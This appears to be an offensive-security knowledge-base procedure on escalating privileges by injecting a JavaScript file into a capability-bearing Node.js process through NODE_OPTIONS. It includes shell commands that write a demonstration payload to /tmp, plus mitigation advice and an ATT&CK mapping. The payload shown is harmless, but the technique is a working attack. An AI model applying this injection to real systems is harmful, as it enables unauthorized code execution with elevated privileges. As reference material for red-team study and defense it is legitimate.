---
id: proc-inject-node-env-var
tags:
  - code-injection
  - nodejs
  - environment-variables
  - privilege-escalation
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/create-malicious-js]]'
  - '[[commands/export-node-options]]'
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Exploitation for Privilege Escalation]]'
updated_at: '2025-12-14T17:29:36.348Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Exploitation for Privilege Escalation]]'
---
# Inject Code via Environment Variables

## Summary

This procedure exploits a Node.js bug on Linux where environment variables set by unprivileged users are not ignored when Linux capabilities other than CAP_NET_BIND_SERVICE are present, allowing code injection that executes with the process's elevated privileges.

## Description

The vulnerability stems from an implementation flaw in Node.js's handling of environment variables under capabilities. Normally, Node.js ignores untrusted env vars except for CAP_NET_BIND_SERVICE, but the exception is misapplied, enabling injection via NODE_OPTIONS to load malicious code. This targets Linux systems running capable Node.js processes, leading to arbitrary JavaScript execution and potential privilege escalation. Prerequisites include a configured capable Node.js binary and unprivileged user access.

## Requirements

1. Node.js binary with capabilities applied (e.g., from prior procedure)
2. Write access to a temporary directory for malicious files
3. Unprivileged user context to set environment variables

## Defense

Defensive measures and detection strategies:

- Patch Node.js to the fixed version (post-report #2237545)
- Explicitly sanitize NODE_OPTIONS and similar vars in service configs
- Use AppArmor or SELinux to restrict Node.js process environment access
- Log and monitor env var changes in process launches

## Objectives

1. Inject malicious code via environment variables into a Node.js process
2. Achieve code execution with inherited elevated privileges
3. Demonstrate escalation by performing privileged actions (e.g., file writes or port binding)

## Instructions

### Step 1: Create Malicious JavaScript Payload

**Context**: Prepare a simple malicious script that executes upon loading, demonstrating code injection by writing a file or logging privileged actions.

**Command** ([[commands/create-malicious-js]]):
```bash
echo 'console.log(\"Code injected successfully!\"); require(\"fs\").writeFileSync(\"/tmp/priv-esc.txt\", \"Escalation achieved via Node.js capabilities\");' > /tmp/malicious.js
```

> This creates a JavaScript file that logs and writes a file upon require. Expected output: File created without errors.

### Step 2: Set Environment Variable and Execute Node.js

**Context**: Export NODE_OPTIONS to load the malicious script, then run a benign Node.js command; the flaw causes the injection to execute with privileges.

**Command** ([[commands/export-node-options]]):
```bash
export NODE_OPTIONS=\"--require=/tmp/malicious.js\"
node -e \"console.log('Normal Node.js execution')\"
```

> This sets the env var and runs Node.js. Expected output: Both the normal log and injected code output, plus the file `/tmp/priv-esc.txt` created, indicating successful injection and potential escalation.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution
- [[Privilege Escalation]] Privilege Escalation

### Techniques

- [[JavaScript]] JavaScript
- [[Exploitation for Privilege Escalation]] Exploitation for Privilege Escalation

### Sub-Techniques

- None

## Commands Used

- [[commands/create-malicious-js]]
- [[commands/export-node-options]]

## Tools Used

- None

## Tags

- [[code-injection]]
- [[nodejs]]
- [[environment-variables]]
